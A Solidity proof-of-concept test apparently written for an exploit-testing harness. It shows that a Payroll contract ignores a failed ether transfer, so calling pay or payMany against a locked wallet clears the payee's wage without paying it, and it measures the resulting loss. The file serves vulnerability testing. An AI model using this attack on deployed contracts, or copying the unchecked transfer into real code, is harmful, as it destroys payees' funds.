// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import {AssayPoC} from "assay/AssayExploit.sol";
import {Payroll} from "../src/Payroll.sol";

/// @notice The victim: a payee's smart-contract wallet that refuses ether while its owner keeps it
///         locked, for example while the keys that control it are being replaced.
contract LockableWallet {
    address private immutable holder;
    bool public locked;

    constructor(address holder_) {
        holder = holder_;
    }

    function setLocked(bool locked_) external {
        require(msg.sender == holder, "not holder");
        locked = locked_;
    }

    receive() external payable {
        require(!locked, "locked");
    }
}

/// @notice Ignored return value: a payment that the payee refuses still clears the payee's wage.
/// Knobs:
///   0 `route`       0 pushes the wage with `pay`, 1 with `payMany`;
///   1 `batch_size`  for `payMany`, the number of payees in the batch; the victim comes last,
///                   after colleagues whose wages are paid normally.
contract PayrollLockedWalletPoC is AssayPoC {
    Payroll internal payroll;
    LockableWallet internal victim;
    address[3] internal colleagues;

    function setUpTarget() internal override {
        address employer = makeAddr("employer");
        address holder = makeAddr("holder");
        victim = new LockableWallet(holder);
        colleagues = [makeAddr("alice"), makeAddr("bob"), makeAddr("carol")];

        vm.deal(employer, 20 ether);
        vm.startPrank(employer);
        payroll = new Payroll();
        payroll.fund{value: 20 ether}();
        payroll.book(address(victim), 5 ether);
        for (uint256 i = 0; i < colleagues.length; i++) {
            payroll.book(colleagues[i], 1 ether);
        }
        vm.stopPrank();

        vm.prank(holder);
        victim.setLocked(true);

        declareAttackerBalance(0, 0, 1 ether);
        declareKnob(0, "route", 0, 0, 1);
        declareKnob(1, "batch_size", 1, 1, colleagues.length + 1);
    }

    function exploit() internal override {
        uint256 valueBefore = payroll.owed(address(victim)) + address(victim).balance;

        vm.startPrank(attacker);
        if (knob(0) == 0) {
            payroll.pay(address(victim));
        } else {
            uint256 size = knob(1);
            address[] memory payees = new address[](size);
            for (uint256 i = 0; i + 1 < size; i++) {
                payees[i] = colleagues[i];
            }
            payees[size - 1] = address(victim);
            payroll.payMany(payees);
        }
        vm.stopPrank();

        victim_loss("eth", valueBefore, payroll.owed(address(victim)) + address(victim).balance);
    }
}
